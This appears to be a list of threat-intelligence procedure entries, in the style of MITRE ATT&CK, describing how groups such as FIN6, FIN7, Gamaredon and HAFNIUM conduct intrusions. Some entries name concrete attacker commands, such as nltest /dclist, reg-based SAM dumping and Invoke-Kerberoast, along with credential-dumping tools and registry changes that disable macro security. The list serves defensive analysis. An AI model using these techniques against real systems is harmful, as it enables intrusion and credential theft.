FIN13 has utilized `nmap` for reconnaissance efforts. FIN13 has also scanned for internal MS-SQL servers in a compromised network.
FIN13 has executed net view commands for enumeration of open shares on compromised machines.
FIN13 has searched for infrastructure that can provide remote access to an environment for targeting efforts.
FIN13 has used the PowerShell utility `Invoke-SMBExec` to execute the pass the hash method for lateral movement within an compromised environment.
FIN13 has enumerated all users and roles from a victim's main treasury system.
FIN13 has used PowerShell commands to obtain DNS data from a compromised network.
FIN13 has utilized web shells and Java tools for tunneling capabilities to and from compromised assets.
FIN13 has used Windows Registry run keys such as, `HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Run\hosts` to maintain persistence.
FIN13 has remotely accessed compromised environments via Remote Desktop Services (RDS) for lateral movement.
FIN13 has leveraged SMB to move laterally within a compromised network via application servers and SQL servers.
FIN13 has remotely accessed compromised environments via secure shell (SSH) for lateral movement.
FIN13 has created scheduled tasks in the `C:\Windows` directory of the compromised network.
FIN13 has extracted the SAM and SYSTEM registry hives using the `reg.exe` binary for obtaining password hashes from a compromised machine.
FIN13 has collected local host information by utilizing Windows commands `systeminfo`, `fsutil`, and `fsinfo`. FIN13 has also utilized a compromised Symantex Altiris console and LanDesk account to retrieve host information.
FIN13 has used `nslookup` and `ipconfig` for network reconnaissance efforts. FIN13 has also utilized a compromised Symantec Altiris console and LanDesk account to retrieve network information.
FIN13 has used `netstat` and other net  commands for network reconnaissance efforts.
FIN13 has utilized publicly available tools such as Mimikatz, Impacket, PWdump7, ProcDump, Nmap, and Incognito V2 for targeting efforts.
FIN13 has used VBS scripts for code execution on comrpomised machines.
FIN13 has used HTTP requests to chain multiple web shells and to contact actor-controlled C2 servers prior to exfiltrating stolen data.
FIN13 has utilized obfuscated and open-source web shells such as JspSpy, reGeorg, MiniWebCmdShell, and Vonloesch Jsp File Browser 1.2 to enable remote code execution and to execute commands on compromised web server.
FIN13 has leveraged `xp_cmdshell` and Windows Command Shell to execute commands on a compromised machine. FIN13 has also attempted to leverage the ‘xp_cmdshell’ SQL procedure to execute remote commands on internal MS-SQL servers.
FIN13 has utilized `WMI` to execute commands and move laterally on compromised Windows machines.
FIN13 has leveraged `WMI` to move laterally within a compromised network via application servers and SQL servers.
FIN4 has created rules in victims' Microsoft Outlook accounts to automatically delete emails containing words such as “hacked," "phish," and “malware" in a likely attempt to prevent organizations from communicating about their activities.
FIN4 has presented victims with spoofed Windows Authentication prompts to collect their credentials.
FIN4 has captured credentials via fake Outlook Web App (OWA) login pages and has also used a .NET based keylogger.
FIN4 has lured victims to launch malicious attachments delivered via spearphishing emails (often sent from compromised accounts).
FIN4 has lured victims to click malicious links delivered via spearphishing emails (often sent from compromised accounts).
FIN4 has used Tor to log in to victims' email accounts.
FIN4 has accessed and hijacked online email communications using stolen credentials.
FIN4 has used spearphishing emails containing attachments (which are often stolen, legitimate documents sent from compromised accounts) with embedded malicious macros.
FIN4 has used spearphishing emails (often sent from compromised accounts) containing malicious links.
FIN4 has used legitimate credentials to hijack email communications.
FIN4 has used VBA macros to display a dialog box and collect victim credentials.
FIN4 has used HTTP POST requests to transmit data.
FIN5 scans processes on all victim systems in the environment and uses automated scripts to pull back the results.
FIN5 has has used the tool GET2 Penetrator to look for remote login and hard-coded credentials.
FIN5 has cleared event logs from victims.
FIN5 scans processes on all victim systems in the environment and uses automated scripts to pull back the results.
FIN5 maintains access to victim environments by using FLIPSIDE to create a proxy for a backup RDP tunnel.
FIN5 has used legitimate VPN, Citrix, or VNC credentials to maintain access to a victim environment.
FIN5 uses SDelete to clean up the environment and attempt to prevent detection.
FIN5 scripts save memory dump data into a specific directory on hosts in the victim environment.
FIN5 has used the open source tool Essential NetTools to map the network and build a list of targets.
FIN5 has obtained and used a customized version of PsExec, as well as use other tools such as pwdump, SDelete, and Windows Credential Editor.
FIN5 has used legitimate VPN, RDP, Citrix, or VNC credentials to maintain access to a victim environment.
FIN6 has used has used Metasploit’s named-pipe impersonation technique to escalate privileges.
Following data collection, FIN6 has compressed log files into a ZIP archive prior to staging and exfiltration.
FIN6 has encoded data gathered from the victim with a simple substitution cipher and single-byte XOR using the 0xAA key, and Base64 with character permutation.
FIN6 used the Plink command-line utility to create SSH tunnels to C2 servers.
FIN6 has used a script to iterate through a list of compromised PoS systems, copy and remove data to a log file, and to bind to events from the submit payment button.
FIN6 has used Comodo code-signing certificates.
FIN6 has used encoded PowerShell commands.
FIN6 has used scripting to iterate through a list of compromised PoS systems, copy data to a log file, and remove the original data files.
FIN6 has used the Stealer One credential stealer to target e-mail and file transfer utilities including FTP.
FIN6 has used the Stealer One credential stealer to target web browsers.
FIN6 has collected schemas and user accounts from systems running SQL Server.
FIN6 has collected and exfiltrated payment card data from compromised systems.
FIN6 has deployed a utility script named &lt;code&gt;kill.bat&lt;/code&gt; to disable anti-virus.
FIN6 has used Metasploit’s PsExec NTDSGRAB module to obtain a copy of the victim's Active Directory database.
FIN6 has sent stolen payment card data to remote servers via HTTP POSTs.
FIN6 has used tools to exploit Windows vulnerabilities in order to escalate privileges. The tools targeted CVE-2013-3660, CVE-2011-2005, and CVE-2010-4398, all of which could allow local users to access kernel-level privileges.
FIN6 has removed files from victim machines.
FIN6 has used malicious JavaScript to steal payment card data from e-commerce sites.
FIN6 has used Windows Credential Editor for credential dumping.
FIN6 has used malicious documents to lure victims into allowing execution of PowerShell scripts.
FIN6 has renamed the "psexec" service name to "mstdc" to masquerade as a legitimate Windows service.
FIN6 has used Metasploit’s PsExec NTDSGRAB module to obtain a copy of the victim's Active Directory database.
FIN6 used publicly available tools (including Microsoft's built-in SQL querying tool, osql.exe) to map the internal network and conduct reconnaissance against Active Directory, Structured Query Language (SQL) servers, and NetBIOS.
FIN6 has used Metasploit Bind and Reverse TCP stagers.
FIN6 has extracted password hashes from ntds.dit to crack offline.
FIN6 has used PowerShell to gain access to merchant's networks, and a Metasploit PowerShell module to download and execute shellcode and to set up a local listener.
FIN6 used the Plink command-line utility to create SSH tunnels to C2 servers.
FIN6 has used Registry Run keys to establish persistence for its downloader tools known as HARDTACK and SHIPBREAD.
FIN6 actors have compressed data from remote systems and moved it to another staging system before exfiltration.
FIN6 used RDP to move laterally in victim networks.
FIN6 used publicly available tools (including Microsoft's built-in SQL querying tool, osql.exe) to map the internal network and conduct reconnaissance against Active Directory, Structured Query Language (SQL) servers, and NetBIOS.
FIN6 has used scheduled tasks to establish persistence for various malware it uses, including downloaders known as HARDTACK and SHIPBREAD and FrameworkPOS.
FIN6 has created Windows services to execute encoded PowerShell commands.
FIN6 has targeted victims with e-mails containing malicious attachments.
FIN6 has used fake job advertisements sent via LinkedIn to spearphish targets.
FIN6 has obtained and used tools such as Mimikatz, Cobalt Strike, and AdFind.
To move laterally on a victim network, FIN6 has used credentials stolen from various systems on which it gathered usernames and password hashes.
FIN6 has used Pastebin and Google Storage to host content for their operations.
FIN6 has used &lt;code&gt;kill.bat&lt;/code&gt; script to disable security tools.
FIN6 has used WMI to automate the remote execution of PowerShell scripts.
FIN7 has used application shim databases for persistence.
FIN7 used legitimate services like Google Docs, Google Scripts, and Pastebin for C2.
FIN7 has used random junk code to obfuscate malware code.
FIN7 has signed Carbanak payloads with legally purchased code signing certificates. FIN7 has also digitally signed their phishing documents, backdoors and other staging tools to bypass security controls.
FIN7 has used fragmented strings, environment variables, standard input (stdin), and native character-replacement functionalities to obfuscate commands.
FIN7 used SQL scripts to help perform tasks on the victim's machine.
FIN7 has gained initial access by compromising a victim's software supply chain.
FIN7 has performed C2 using DNS via A, OPT, and TXT records.
FIN7 has encrypted virtual disk volumes on ESXi servers using a version of Darkside ransomware.
FIN7 has collected files and other sensitive information from a compromised network.
FIN7 has used the command `net group "domain admins" /domain` to enumerate domain groups.
FIN7 has registered look-alike domains for use in phishing campaigns.
FIN7 has compromised a digital product website and modified multiple download links to point to trojanized versions of offered digital products.
FIN7 spear phishing campaigns have included malicious Word documents with DDE execution.
FIN7 has exfiltrated stolen data to the MEGA file sharing site.
FIN7 has compromised targeted organizations through exploitation of CVE-2021-31207 in Exchange.
FIN7 has exploited ZeroLogon (CVE-2020-1472) against vulnerable domain controllers.
FIN7's Harpy backdoor malware can use DNS as a backup channel for C2 if HTTP fails.
FIN7 has downloaded additional malware to execute on the victim's machine, including by using a PowerShell script to launch shellcode that retrieves an additional payload.
FIN7 used JavaScript scripts to help perform tasks on the victim's machine.
FIN7 has used Kerberoasting PowerShell commands such as, `Invoke-Kerberoast` for credential access and to enable lateral movement.
FIN7 has used compromised credentials for access as SYSTEM on Exchange servers.
FIN7 lured victims to double-click on images in the attachments they sent which would then execute the hidden LNK file.
FIN7 has used malicious links to lure victims into downloading malware.
FIN7 has developed malware for use in operations, including the creation of infected removable media.
FIN7 has created a scheduled task named “AdobeFlashSync” to establish persistence.
FIN7 has attempted to run Darkside ransomware with the filename sleep.exe.
FIN7 has used mshta.exe to execute VBScript to execute malicious code on victim systems.
FIN7 has used port-protocol mismatches on ports such as 53, 80, 443, and 8080 during C2.
FIN7 used a PowerShell script to launch shellcode that retrieved an additional payload.
FIN7 malware has created Registry Run and RunOnce keys to establish persistence, and has also added items to the Startup folder.
FIN7 has utilized the remote management tool Atera to download malware to a compromised system.
FIN7 has used RDP to move laterally in victim environments.
FIN7 actors have mailed USB drives to potential victims containing malware that downloads and installs various backdoors, including in some cases for ransomware operations.
FIN7 has used `rundll32.exe` to execute malware on a compromised network.
FIN7 has used SSH to move laterally through victim environments.
FIN7 malware has created scheduled tasks to establish persistence.
FIN7 captured screenshots and desktop video recordings.
FIN7 sent spearphishing emails with either malicious Microsoft Documents or RTF files attached.
FIN7 has conducted broad phishing campaigns using malicious links.
FIN7 has used the command `cmd.exe /C quser` to collect user session information.
FIN7 has utilized a variety of tools such as Cobalt Strike, PowerSploit, and the remote management tool, Atera for targeting efforts.
FIN7 has staged legitimate software, that was trojanized to contain an Atera agent installer, on Amazon S3.
FIN7 used images embedded into document lures that only activate the payload when a user double clicks to avoid sandboxes.
FIN7 has used TightVNC to control compromised hosts.
FIN7 has harvested valid administrative credentials for lateral movement.
FIN7 created a custom video recording capability that could be used to monitor operations in the victim's environment.
FIN7 used VBS scripts to help perform tasks on the victim's machine.
FIN7 has set up Amazon S3 buckets to host trojanized digital products.
FIN7 used the command prompt to launch commands on the victim’s machine.
FIN7 has used WMI to install malware on targeted systems.
FIN7 created new Windows services and added them to the startup directories for persistence.
FIN8 has used RAR to compress collected data before exfiltration.
FIN8 has used the Plink utility to tunnel RDP back to C2 infrastructure.
FIN8 has injected malicious code into a new svchost.exe process.
FIN8 has cleared logs during post compromise cleanup activities.
FIN8 has used an expired open-source X.509 certificate for testing in the OpenSSL repository, to connect to actor-controlled C2 servers.
FIN8 has used environment variables and standard input (stdin) to obfuscate command-line arguments. FIN8 also obfuscates malicious macros delivered as payloads.
FIN8 has deployed ransomware such as Ragnar Locker, White Rabbit, and attempted to execute Noberus on compromised networks.
FIN8 has retrieved a list of trusted domains by using &lt;code&gt;nltest.exe /domain_trusts&lt;/code&gt;.
FIN8 has used FTP to exfiltrate collected data.
FIN8 has exploited the CVE-2016-0167 local vulnerability.
FIN8 has deleted tmp and prefetch files during post compromise cleanup activities. FIN8 has also deleted PowerShell scripts to evade detection on compromised machines.
FIN8 has used remote code execution to download subsequent payloads.
FIN8 has used the Ping command to check connectivity to actor-controlled C2 servers.
FIN8 harvests credentials using Invoke-Mimikatz or Windows Credentials Editor (WCE).
FIN8 has used malicious e-mail attachments to lure victims into executing malware.
FIN8 has used emails with malicious links to lure victims into installing malware.
FIN8 has deleted Registry keys during post compromise cleanup activities.
FIN8's malicious spearphishing payloads are executed as PowerShell. FIN8 has also used PowerShell for lateral movement and credential access.
FIN8 aggregates staged data from a network into a single location.
FIN8 has used RDP for lateral movement.
FIN8 has used dsquery and other Active Directory utilities to enumerate hosts; they have also used &lt;code&gt;nltest.exe /dclist&lt;/code&gt; to retrieve a list of domain controllers.
FIN8 has attempted to map to C$ on enumerated hosts to test the scope of their current credentials/context. FIN8 has also used smbexec from the Impacket suite for lateral movement.
FIN8 has used scheduled tasks to maintain RDP backdoors.
FIN8 has used Registry keys to detect and avoid executing in potential sandboxes.
FIN8 has distributed targeted emails containing Word documents with embedded malicious macros.
FIN8 has distributed targeted emails containing links to malicious documents with embedded macros.
FIN8 has used PowerShell Scripts to check the architecture of a compromised machine before the selection of a 32-bit or 64-bit version of a malicious .NET loader.
FIN8 has executed the command `quser` to display the session details of a compromised machine.
FIN8 has used a malicious framework designed to impersonate the lsass.exe/vmtoolsd.exe token.
FIN8 has used open-source tools such as Impacket for targeting efforts.
FIN8 has used valid accounts for persistence and lateral movement.
FIN8 has used HTTPS for command and control.
FIN8 has used &lt;code&gt;sslip.io&lt;/code&gt;, a free IP to domain mapping service that also makes SSL certificate generation easier for traffic encryption, as part of their command and control.
FIN8 has used a Batch file to automate frequently executed post compromise cleanup activities. FIN8 has also executed commands remotely via `cmd.exe`.
FIN8's malicious spearphishing payloads use WMI to launch malware and spawn `cmd.exe` execution. FIN8 has also used WMIC and the Impacket suite for lateral movement, as well as during and post compromise cleanup activities.
FIN8 has used WMI event subscriptions for persistence.
Ferocious Kitten has acquired domains imitating legitimate sites.
Ferocious Kitten has attempted to convince victims to enable malicious content within a spearphishing email by including an odd decoy message.
Ferocious Kitten has named malicious files &lt;code&gt;update.exe&lt;/code&gt; and loaded them into the compromise host's “Public” folder.
Ferocious Kitten has used right-to-left override to reverse executables’ names to make them appear to have different file extensions, rather than their real ones.
Ferocious Kitten has conducted spearphishing campaigns containing malicious documents to lure victims to open the attachments.
Ferocious Kitten has obtained open source tools for its operations, including JsonCPP and Psiphon.
Fox Kitten has used sticky keys to launch a command prompt.
Fox Kitten has used 7-Zip to archive data.
Fox Kitten has used Google Chrome bookmarks to identify internal resources and assets.
Fox Kitten has brute forced RDP credentials.
Fox Kitten has base64 encoded scripts to avoid detection.
Fox Kitten has used a Perl reverse shell to communicate with C2.
Fox Kitten has accessed files to gain valid credentials.
Fox Kitten has obtained files from the victim's cloud storage instances.
Fox Kitten has accessed victim security and IT environments and Microsoft Teams to mine valuable information.
Fox Kitten has searched local system resources to access sensitive documents.
Fox Kitten has searched network shares to access sensitive documents.
Fox Kitten has used the Softerra LDAP browser to browse documentation on service accounts.
Fox Kitten has base64 encoded payloads to avoid detection.
Fox Kitten has created KeyBase accounts to communicate with ransomware victims.
Fox Kitten has exploited known vulnerabilities in Fortinet, PulseSecure, and Palo Alto VPN appliances.
Fox Kitten has exploited known vulnerabilities in remote services including RDP.
Fox Kitten has used WizTree to obtain network files and directory listings.
Fox Kitten has downloaded additional tools including PsExec directly to endpoints.
Fox Kitten has used prodump to dump credentials from LSASS.
Fox Kitten has accessed ntuser.dat and UserClass.dat on compromised hosts.
Fox Kitten has created a local user account with administrator privileges.
Fox Kitten has named the task for a reverse proxy lpupdate to appear legitimate.
Fox Kitten has named binaries and configuration files svhost and dllhost respectively to appear legitimate.
Fox Kitten has used Volume Shadow Copy to access credential information from NTDS.
Fox Kitten has used tools including NMAP to conduct broad scanning to identify open ports.
Fox Kitten has used scripts to access credential information from the KeePass database.
Fox Kitten has used PowerShell scripts to access credential data.
Fox Kitten has used protocol tunneling for communication and RDP activity on compromised hosts through the use of open source tools such as ngrok and custom tool SSHMinion.
Fox Kitten has used the open source reverse proxy tools including FRPC and Go Proxy to establish connections from C2 to local servers.
Fox Kitten has accessed Registry hives ntuser.dat and UserClass.dat.
Fox Kitten has used RDP to log in and move laterally in the target environment.
Fox Kitten has used Angry IP Scanner to detect remote systems.
Fox Kitten has used valid accounts to access SMB shares.
Fox Kitten has used the PuTTY and Plink tools for lateral movement.
Fox Kitten has used Scheduled Tasks for persistence and to load and execute a reverse proxy binary.
Fox Kitten has used a Twitter account to communicate with ransomware victims.
Fox Kitten has installed TightVNC server and client on compromised servers and endpoints for lateral movement.
Fox Kitten has used valid credentials with various services during lateral movement.
Fox Kitten has used Amazon Web Services to host C2.
Fox Kitten has installed web shells on compromised hosts to maintain access.
Fox Kitten has used cmd.exe likely as a password changing mechanism.
GALLIUM used WinRAR to compress and encrypt stolen data prior to exfiltration.
GALLIUM has used stolen certificates to sign its tools including those from Whizzimo LLC.
GALLIUM used DLL side-loading to covertly load PoisonIvy into memory on the victim machine.
GALLIUM collected data from the victim's local system, including password hashes from the SAM hive in the Registry.
GALLIUM created high-privileged domain user accounts to maintain access to victim networks.
GALLIUM used Web shells and HTRAN for C2 and to exfiltrate data.
GALLIUM exploited a publicly-facing servers including Wildfly/JBoss servers to gain access to the network.
GALLIUM used a modified version of HTRAN to redirect connections between networks.
GALLIUM has used VPN services, including SoftEther VPN, to access and maintain persistence in victim environments.
GALLIUM ensured each payload had a unique hash, including by using different types of packers.
GALLIUM dropped additional tools to victims during their operation, including portqry.exe, a renamed cmd.exe file, winrar, and HTRAN.
GALLIUM used a modified version of Mimikatz along with a PowerShell-based Mimikatz to dump credentials on the victim machines.
GALLIUM has used PsExec to move laterally between hosts in the target network.
GALLIUM compressed and staged files in multi-part archives in the Recycle Bin prior to exfiltration.
GALLIUM used a modified version of HTRAN in which they obfuscated strings such as debug messages in an apparent attempt to evade detection.
GALLIUM used dumped hashes to authenticate to other machines via pass the hash.
GALLIUM used PowerShell for execution to assist in lateral movement as well as for dumping credentials stored on compromised machines.
GALLIUM used a modified version of NBTscan to identify available NetBIOS name servers over the network as well as &lt;code&gt;ping&lt;/code&gt; to identify remote systems.
GALLIUM used a renamed cmd.exe file to evade detection.
GALLIUM established persistence for PoisonIvy by created a scheduled task.
GALLIUM used &lt;code&gt;reg&lt;/code&gt; commands to dump specific hives from the Windows Registry, such as the SAM hive, and obtain password hashes.
GALLIUM has used Taiwan-based servers that appear to be exclusive to GALLIUM.
GALLIUM packed some payloads using different types of packers, both known and custom.
GALLIUM used &lt;code&gt;ipconfig /all&lt;/code&gt; to obtain information about the victim network configuration. The group also ran a modified version of NBTscan to identify available NetBIOS name servers.
GALLIUM used &lt;code&gt;netstat -oan&lt;/code&gt; to obtain information about the victim network connections.
GALLIUM used &lt;code&gt;whoami&lt;/code&gt; and &lt;code&gt;query user&lt;/code&gt; to obtain information about the victim user.
GALLIUM has used a variety of widely-available tools, which in some cases they modified to add functionality and/or subvert antimalware solutions.
GALLIUM leveraged valid accounts to maintain access to a victim network.
GALLIUM used Web shells to persist in victim environments and assist in execution and exfiltration.
GALLIUM used the Windows command shell to execute commands.
GALLIUM used WMI for execution to assist in lateral movement as well as for installing tools across multiple assets.
GCMAN uses Putty for lateral movement.
GCMAN uses VNC for lateral movement.
GOLD SOUTHFIELD has executed base64 encoded PowerShell scripts on compromised hosts.
GOLD SOUTHFIELD has distributed ransomware by backdooring software installers via a strategic web compromise of the site hosting Italian WinRAR.
GOLD SOUTHFIELD has exploited Oracle WebLogic vulnerabilities for initial compromise.
GOLD SOUTHFIELD has used publicly-accessible RDP and remote management and monitoring (RMM) servers to gain access to victim machines.
GOLD SOUTHFIELD has conducted malicious spam (malspam) campaigns to gain access to victim's machines.
GOLD SOUTHFIELD has staged and executed PowerShell scripts on compromised hosts.
GOLD SOUTHFIELD has used the cloud-based remote management and monitoring tool "ConnectWise Control" to deploy REvil.
GOLD SOUTHFIELD has used the remote monitoring and management tool ConnectWise to obtain screen captures from victim's machines.
GOLD SOUTHFIELD has breached Managed Service Providers (MSP's) to deliver malware to MSP customers.
Gallmaker has used WinZip, likely to archive data prior to exfiltration.
Gallmaker attempted to exploit Microsoft’s DDE protocol in order to gain access to victim machines and for execution.
Gallmaker sent victims a lure document with a warning that asked victims to “enable content” for execution.
Gallmaker obfuscated shellcode used during execution.
Gallmaker used PowerShell to download additional payloads and for execution.
Gallmaker sent emails with malicious Microsoft Office documents attached.
Gamaredon Group has deployed scripts on compromised systems that automatically scan for interesting documents.
Gamaredon Group has used modules that automatically upload gathered documents to the C2 server.
Gamaredon Group has obfuscated .NET executables by inserting junk code.
Gamaredon Group has used obfuscated or encrypted scripts.
Gamaredon Group has compiled the source code for a downloader directly on the infected system using the built-in &lt;code&gt;Microsoft.CSharp.CSharpCodeProvider&lt;/code&gt; class.
Gamaredon Group malware can insert malicious macros into documents using a &lt;code&gt;Microsoft.Office.Interop&lt;/code&gt; object.
Gamaredon Group has used tools to delete files and folders from victims' desktops and profiles.
Gamaredon Group has collected files from infected systems and uploaded them to a C2 server.
Gamaredon Group malware has collected Microsoft Office documents from mapped network drives.
A Gamaredon Group file stealer has the capability to steal data from newly connected logical volumes on a system, including USB drives.
Gamaredon Group tools decrypted additional payloads from the C2. Gamaredon Group has also decoded base64-encoded source code of a downloader.
Gamaredon Group has delivered macros which can tamper with Microsoft Office security settings.
Gamaredon Group has registered multiple domains to facilitate payload staging and C2.
Gamaredon Group has incorporated dynamic DNS domains in its infrastructure.
A Gamaredon Group file stealer can transfer collected files to a hardcoded C2 server.
Gamaredon Group tools can delete files used during an operation.
Gamaredon Group macros can scan for Microsoft Word and Excel files to inject with additional malicious macros. Gamaredon Group has also used its backdoors to automatically list interesting files (such as Office documents) found on a system.
Gamaredon Group has used &lt;code&gt;hidcon&lt;/code&gt; to run batch files in a hidden console window.
Gamaredon Group has downloaded additional malware and tools onto a compromised host.
Gamaredon Group has left taunting images and messages on the victims' desktops as proof of system access.
Gamaredon Group has used an Outlook VBA module on infected systems to send phishing emails with malicious attachments to other employees within the organization.
Gamaredon Group has tested connectivity between a compromised machine and a C2 server using  Ping with commands such as `CSIDL_SYSTEM\cmd.exe /c ping -n 1`.
Gamaredon Group has attempted to get users to click on Office attachments with malicious macros embedded.
Gamaredon Group has used legitimate process names to hide malware including &lt;code&gt;svchosst&lt;/code&gt;.
Gamaredon Group has removed security settings for VBA macro execution by changing registry values &lt;code&gt;HKCU\Software\Microsoft\Office\&lt;version&gt;\&lt;product&gt;\Security\VBAWarnings&lt;/code&gt; and &lt;code&gt;HKCU\Software\Microsoft\Office\&lt;version&gt;\&lt;product&gt;\Security\AccessVBOM&lt;/code&gt;.
Gamaredon Group has used `mshta.exe` to execute malicious HTA files.
Gamaredon Group malware has used &lt;code&gt;CreateProcess&lt;/code&gt; to launch additional malicious components.
Gamaredon Group has delivered self-extracting 7z archive files within malicious document attachments.
Gamaredon Group has inserted malicious macros into existing documents, providing persistence when they are reopened. Gamaredon Group has loaded the group's previously delivered VBA project by relaunching Microsoft Outlook with the &lt;code&gt;/altvba&lt;/code&gt; option, once the Application.Startup event is received.
Gamaredon Group tools have contained an application to check performance of USB flash drives. Gamaredon Group has also used malware to scan for removable drives.
Gamaredon Group has used obfuscated PowerShell scripts for staging.
Gamaredon Group has used tools to enumerate processes on target hosts including Process Explorer.
Gamaredon Group tools have registered Run keys in the registry to give malicious VBS files persistence.
Gamaredon Group malware has used rundll32 to launch additional malicious components.
Gamaredon Group has created scheduled tasks to launch executables after a designated number of minutes have passed.
Gamaredon Group's malware can take screenshots of the compromised computer every minute.
Gamaredon Group has delivered spearphishing emails with malicious attachments to targets.
A Gamaredon Group file stealer can gather the victim's computer name and drive serial numbers to send to a C2 server.
A Gamaredon Group file stealer can gather the victim's username to send to a C2 server.
Gamaredon Group has injected malicious macros into all Word and Excel documents on mapped network drives.
Gamaredon Group has used DOCX files to download malicious DOT document templates and has used RTF template injection to download malicious payloads. Gamaredon Group can also inject malicious macros or remote templates into documents already present on compromised systems.
Gamaredon Group has registered domains to stage payloads.
Gamaredon Group has used VNC tools, including UltraVNC, to remotely interact with compromised hosts.
Gamaredon Group has embedded malicious macros in document templates, which executed VBScript. Gamaredon Group has also delivered Microsoft Outlook VBA projects with embedded macros.
Gamaredon Group has used HTTP and HTTPS for C2 communications.
Gamaredon Group has used GitHub repositories for downloaders which will be obtained by the group's .NET executable on the compromised system.
Gamaredon Group has used various batch scripts to establish C2 and download additional files. Gamaredon Group's backdoor malware has also been written to a batch file.
Gamaredon Group has used WMI to execute scripts used for discovery.
Gorgon Group malware can decode contents from a payload that was Base64 encoded and write the contents to a file.
Gorgon Group malware can attempt to disable security features in Microsoft Office and Windows Defender using the &lt;code&gt;taskkill&lt;/code&gt; command.
Gorgon Group has used &lt;code&gt;-W Hidden&lt;/code&gt; to conceal PowerShell windows by setting the WindowStyle parameter to hidden.
Gorgon Group malware can download additional files from C2 servers.
Gorgon Group attempted to get users to launch malicious Microsoft Office attachments delivered via spearphishing emails.
Gorgon Group malware can deactivate security mechanisms in Microsoft Office by editing several keys and values under &lt;code&gt;HKCU\Software\Microsoft\Office\&lt;/code&gt;.
Gorgon Group malware can leverage the Windows API call, CreateProcessA(), for execution.
Gorgon Group malware can download a remote access tool, ShiftyBug, and inject into another process.
Gorgon Group malware can use PowerShell commands to download and execute a payload and open a decoy document on the victim’s machine.
Gorgon Group malware can use process hollowing to inject one of its trojans into another process.
Gorgon Group malware can create a .lnk file and add a Registry Run key to establish persistence.
Gorgon Group malware can create a .lnk file and add a Registry Run key to establish persistence.
Gorgon Group sent emails to victims with malicious Microsoft Office documents attached.
Gorgon Group has obtained and used tools such as QuasarRAT and Remcos.
Gorgon Group has used macros in Spearphishing Attachments as well as executed VBScripts on victim machines.
Gorgon Group malware can use cmd.exe to download and execute payloads and to execute commands on the system.
Group5 disguised its malicious binaries with several layers of obfuscation, including encrypting the files.
Malware used by Group5 is capable of remotely deleting files from victims.
Malware used by Group5 is capable of capturing keystrokes.
Malware used by Group5 is capable of watching the victim's screen.
HAFNIUM has granted privileges to domain accounts.
HAFNIUM has used 7-Zip and WinRAR to compress stolen files for exfiltration.
HAFNIUM has interacted with Office 365 tenants to gather details regarding target's environments.
HAFNIUM has collected data and files from a compromised machine.
HAFNIUM has created domain accounts.
HAFNIUM has collected e-mail addresses for users they intended to target.
HAFNIUM has exfiltrated data to file sharing sites, including MEGA.
HAFNIUM has exploited CVE-2021-44228 in Log4j and CVE-2021-26855, CVE-2021-26857, CVE-2021-26858, and CVE-2021-27065  to compromise on-premises versions of Microsoft Exchange Server.
HAFNIUM has searched file contents on a compromised host.
HAFNIUM gathered the fully qualified domain names (FQDNs) for targeted Exchange servers in the victim's environment.
HAFNIUM has hidden files on a compromised host.
HAFNIUM has obtained IP addresses for publicly-accessible Exchange servers.
HAFNIUM has downloaded malware and tools--including Nishang and PowerCat--onto a compromised host.
HAFNIUM has checked for network connectivity from a compromised host using `ping`, including attempts to contact `google[.]com`.
HAFNIUM has used &lt;code&gt;procdump&lt;/code&gt; to dump the LSASS process memory.
HAFNIUM has used the NT AUTHORITY\SYSTEM account to create files on Exchange servers.
HAFNIUM has stolen copies of the Active Directory database (NTDS.DIT).
HAFNIUM has used TCP for C2.
HAFNIUM has used the Exchange Power Shell module &lt;code&gt;Set-OabVirtualDirectoryPowerShell&lt;/code&gt; to export mailbox data.
HAFNIUM has used `tasklist` to enumerate processes.
HAFNIUM has used web shells to export mailbox data.
HAFNIUM has enumerated domain controllers using `net group "Domain computers"` and `nltest /dclist`.
HAFNIUM has used &lt;code&gt;rundll32&lt;/code&gt; to load malicious DLLs.
HAFNIUM has used ASCII encoding for C2 traffic.
HAFNIUM has collected IP information via IPInfo.
HAFNIUM has used `whoami` to gather user information.
HAFNIUM has operated from leased virtual private servers (VPS) in the United States.
HAFNIUM has used open-source C2 frameworks, including Covenant.
HAFNIUM has acquired web services for use in C2 and exfiltration.
HAFNIUM has deployed multiple web shells on compromised servers including SIMPLESEESHARP, SPORTSBALL, China Chopper, and ASPXSpy.
HAFNIUM has used `cmd.exe` to execute commands on the victim's machine.
HEXANE has used a PowerShell-based keylogging tool to capture the window title.
HEXANE has used cloud services, including OneDrive, for C2.
HEXANE has used brute force attacks to compromise valid credentials.
HEXANE has used Base64-encoded scripts.
HEXANE has run `cmdkey` on victim machines to identify stored credentials.
HEXANE has used a Mimikatz-based tool and a PowerShell script to steal passwords from Google Chrome.
HEXANE has set up custom DNS servers to send commands to compromised hosts via TXT records.
HEXANE has registered and operated domains for campaigns, often using a security or web technology theme or impersonating the targeted organization.
HEXANE has used compromised accounts to send spearphishing emails.
HEXANE has established email accounts for use in domain registration including for ProtonMail addresses.
HEXANE has targeted executives, human resources staff, and IT personnel for spearphishing.
HEXANE has used cloud services, including OneDrive, for data exfiltration.
HEXANE has identified specific potential victims at targeted organizations.
HEXANE has identified executives, HR, and IT staff at victim organizations for further targeting.
HEXANE has downloaded additional payloads and malicious scripts onto a compromised host.
HEXANE has conducted internal spearphishing attacks against executives, HR, and IT personnel to gain information and access.
HEXANE has used tools including BITSAdmin to test internet connectivity from compromised hosts.
HEXANE has used a PowerShell-based keylogger named `kl.ps1`.
HEXANE has run `net localgroup` to enumerate local groups.
HEXANE has relied on victim's executing malicious file attachments delivered via email or embedded within actor-controlled websites to deliver malware.
HEXANE has used password spraying attacks to obtain valid credentials.
HEXANE has used PowerShell-based tools and scripts for discovery and collection on compromised hosts.
HEXANE has enumerated processes on targeted systems.
HEXANE has used remote desktop sessions for lateral movement.
HEXANE has used `net view` to enumerate domain machines.
HEXANE has used a scheduled task to establish persistence for a keylogger.
HEXANE has established fraudulent LinkedIn accounts impersonating HR department employees to target potential victims with fake job offers.
HEXANE has enumerated programs installed on an infected machine.
HEXANE has collected the hostname of a compromised machine.
HEXANE has used Ping and `tracert` for network discovery.
HEXANE has used netstat to monitor connections to specific ports.
HEXANE has run `whoami` on compromised machines to identify the current user.
HEXANE has acquired, and sometimes customized, open source tools such as Mimikatz, Empire, VNC remote access software, and DIG.net.
HEXANE has staged malware on fraudulent websites set up to impersonate targeted organizations.
HEXANE has used a VisualBasic script named `MicrosoftUpdator.vbs` for execution of a PowerShell keylogger.
HEXANE has used WMI event subscriptions for persistence.
Higaisa performed padding with null bytes before calculating its hash.
